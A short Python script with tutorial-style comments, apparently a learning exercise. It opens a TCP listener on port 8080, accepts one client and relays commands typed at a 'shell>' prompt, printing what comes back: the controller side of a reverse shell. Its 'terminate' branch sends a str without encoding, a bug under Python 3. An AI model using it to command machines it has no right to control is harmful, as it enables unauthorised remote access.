import socket

# socket.AF_INET -> refers to we using IPV4
# socket.SOCK_STREAM -> refers to we using TCP protocol
# creating socket object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)



# In a local network, hostnames can be resolved to IP addresses using a local DNS server,
# broadcasting a name resolution request on the network,
# or by using the local hosts file on each device.
ip = socket.gethostbyname(socket.gethostname())
port = 8080

# associating created socket object with an ip and port 
s.bind((ip, port))

# here we setuping the number of connections that the server can handle.
s.listen(1)

# addr -> returns tuple of (ip of client, port client <uses for that connection that would receive connection on that>)
# client_socket -> A new socket object representing the connection with the client
client_socket, addr = s.accept()
# we got connection

# addr -> returns tuple of (ip of client, port client <uses for that connection that would receive connection on that>)


while True:
    command = input("shell> ")

    if 'terminate' in command:
        client_socket.send('terminate')
        client_socket.close()
        break

    else:
        client_socket.send(command.encode())
        print(client_socket.recv(1024) )
